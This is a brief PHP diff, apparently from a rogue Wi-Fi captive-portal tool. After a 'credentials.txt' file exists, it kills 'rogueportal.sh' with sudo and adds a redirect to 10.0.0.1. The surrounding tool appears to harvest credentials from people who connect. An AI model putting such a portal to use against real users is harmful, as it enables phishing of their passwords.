@@ -18,5 +18,8 @@ if (!file_exists('credentials.txt')) {
 }
 
 shell_exec("sudo killall -SIGINT -g rogueportal.sh");
+sleep (2);
+header("location: http://10.0.0.1");
+exit;
 
 ?>
